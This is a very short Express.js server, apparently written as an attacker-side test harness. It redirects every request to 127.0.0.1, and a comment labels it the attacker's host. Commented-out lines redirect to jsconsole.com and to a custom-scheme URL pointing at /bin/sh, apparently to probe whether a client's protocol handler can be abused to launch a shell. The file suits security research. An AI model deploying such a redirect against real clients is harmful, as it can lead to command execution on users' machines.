const express = require("express");
const app = express();

app.all("*", (_, res) => {
	// Attacker's host redirect to
	// help: // ???
	// 127.0.0.1
	res.redirect("https://127.0.0.1");
	// res.redirect("https://jsconsole.com");
	// res.redirect("x-help-icon:///bin/sh");
});

app.listen(80);
